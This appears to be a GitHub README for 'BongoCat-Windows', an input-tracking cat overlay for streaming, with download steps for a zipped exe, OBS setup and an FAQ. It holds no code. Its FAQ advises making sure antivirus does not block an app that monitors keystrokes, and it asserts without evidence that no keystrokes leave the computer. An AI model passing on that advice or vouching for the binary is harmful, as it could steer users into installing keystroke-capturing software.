# 😺 BongoCat-Windows - Add animated fun to your desktop

[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Lavalavamosaiclaw205/BongoCat-Windows/releases)

BongoCat-Windows is a desktop application that displays a Bongo Cat character on your screen. This character tracks your mouse movements and keyboard keys in real time. It mimics your input on instruments like a piano, keyboard, or guitar. The app works well as an overlay for streaming software like OBS. You can customize the look of the character with different skins to match your desktop setup. It serves as a visualizer for your rhythm games or music production sessions.

## 🛠 Features

BongoCat-Windows provides a suite of tools for your desktop.

- Real-time input tracking for keyboard and mouse.
- Musical instrument modes including piano, drums, and trumpet.
- Customizable skins to change the character appearance.
- OBS mode for transparent streaming overlays.
- Low system impact to keep your computer fast.
- Multiple language settings for global support.
- Pixel art animations for a retro look.

## ⚙️ System Requirements

Ensure your computer meets these requirements to run the software.

- Windows 10 or Windows 11.
- At least 2GB of RAM.
- A modern processor.
- Graphics support equivalent to DirectX 11.
- Approximately 100MB of storage space.

## 📥 Getting Started

Follow these steps to set up the application on your computer.

1. Visit the [releases page](https://github.com/Lavalavamosaiclaw205/BongoCat-Windows/releases) to access the latest files.
2. Look for the file named BongoCat-Windows.zip in the Assets section of the latest release.
3. Click the file name to start the download.
4. Open your Downloads folder once the file finishes downloading.
5. Right-click the zip file and select Extract All.
6. Choose a folder on your computer where you want to keep the application.
7. Open the folder you just created.
8. Locate the file named BongoCat.exe and double-click it to start the app.

## 🎨 Customizing Your Pet

The application allows you to change how your Bongo Cat appears on the screen. The config folder contains text files that control the behavior and style of the pet. 

- Open the folder named config in the application directory.
- Use a simple text editor like Notepad to open the settings file.
- Change the values within the file to adjust the character size, position, or mode.
- Save the file and restart the application to apply your changes.

You can also swap the image files in the skins folder to create your own looks. Ensure the new images match the dimensions of the original files to maintain the animation quality.

## 🎮 Using the App for Streaming

Many users run this app to show their inputs during live streams. Follow these steps to set the app up in OBS.

1. Open OBS Studio and go to your scene.
2. Click the plus icon under the Sources box.
3. Select Window Capture.
4. Choose BongoCat-Windows from the list of windows.
5. Check the box to use the application window.
6. Adjust the size of the window to fit your stream layout.
7. Use the chroma key filter in OBS to make the background of the app transparent if needed.

## ❓ Frequently Asked Questions

What should I do if the app does not open?
Check that your antivirus program does not block the application. The app requires permission to track your keyboard and mouse activity to function.

Does this app record my keystrokes?
The application monitors your input locally to create the animation. It does not send your keystrokes to any remote server. Your data stays on your computer.

Can I move the cat around the screen?
Yes, you can click and drag the window to place the cat anywhere on your desktop. 

Why is the animation frame rate low?
Check your computer power settings. Ensure your laptop is plugged in when you perform resource-heavy tasks. A high-refresh display might also require adjustments in the settings file to sync the animation speed correctly.

Is the app compatible with all rhythm games?
The app captures generic keyboard and mouse signals. It works with most applications that map actions to standard keys. 

How do I add new instruments?
You can add image assets to the themes folder. The application loads these images based on the specific keyboard inputs you assign in the configuration file.

Can I run multiple instances of the application?
Running multiple copies of the program might conflict with input tracking. Use one instance for the best experience. 

Where can I find more help?
Look at the local documentation files inside the application folder. These folders contain guides on advanced configuration and troubleshooting common display issues.

The application team provides updates to improve compatibility with newer versions of Windows. Check the release link periodically for new versions. Each update brings fixes and minor improvements to the animation style.